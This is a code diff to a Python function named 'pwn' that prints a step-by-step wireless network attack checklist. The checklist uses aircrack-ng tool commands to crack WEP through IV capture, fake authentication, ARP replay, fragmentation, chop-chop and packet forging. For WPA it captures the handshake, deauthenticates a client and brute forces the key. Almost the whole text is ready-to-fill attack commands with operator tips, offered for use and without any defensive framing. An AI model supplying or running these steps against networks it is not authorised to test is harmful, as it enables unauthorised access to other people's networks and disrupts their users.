@@ -63,18 +63,23 @@ def pwn(interface, network):
 	
 	if network["Encryption"].startswith("WEP"):
 		instructions = """
+=== Capture IVs ==
+airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE
+
 == Get Deauthetication Packets (Fake Authentication) ==
 aireplay-ng -1 0 -e 'NAME' -a BSSID -h MAC INTERFACE
 OR
 aireplay-ng -1 6000 -o 1 -q 10 -e 'NAME' -a BSSID -h MAC INTERFACE
+* the latter is good for persnikitty stations
 
 == Request ARP Packets ==
 aireplay-ng -3 -b BSSID -h MAC INTERFACE
-* if successful move to capture IVs
+* if successful, skip the next three steps and move to analyze
 
 == Fragmentation Attack (if requesting ARPs didn't work - no users on network) ==
 aireplay-ng -5 -b BSSID -h MAC INTERFACE
 * use this packet? yes
+* if successful, skip the next step and construct an arp packet
 
 == Chop-Chop Attach (if fragmentation fails) ==
 aireplay-ng -4 -b BSSID -h MAC INTERFACE
@@ -84,10 +89,7 @@ aireplay-ng -4 -b BSSID -h MAC INTERFACE
 packetforge-ng -0 -a BSSID -h MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request
 * k source, l destination - change for persnikittiness
 
-== Capture IVs ==
-airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE
-
-== Inject Constructed ARP (if fragmentation or chop-chop) ==
+= Inject Constructed ARP (if fragmentation or chop-chop) ==
 aireplay-ng -2 -r arp-request INTERFACE
 * use this packet? yes
 
@@ -99,7 +101,7 @@ aircrack-ng -z -b BSSID output*.cap
 == Collect 4-way Authentication Handshake ==
 airodump-ng -c CHANNEL --bssid BSSID -w psk INTERFACE
 
-== Deauthenticate Wireless Client (optional) ==
+== Deauthenticate Wireless Client ==
 aireplay-ng -0 1 -a BSSID -c CLIENT wlan0
 
 == Brute Force ==
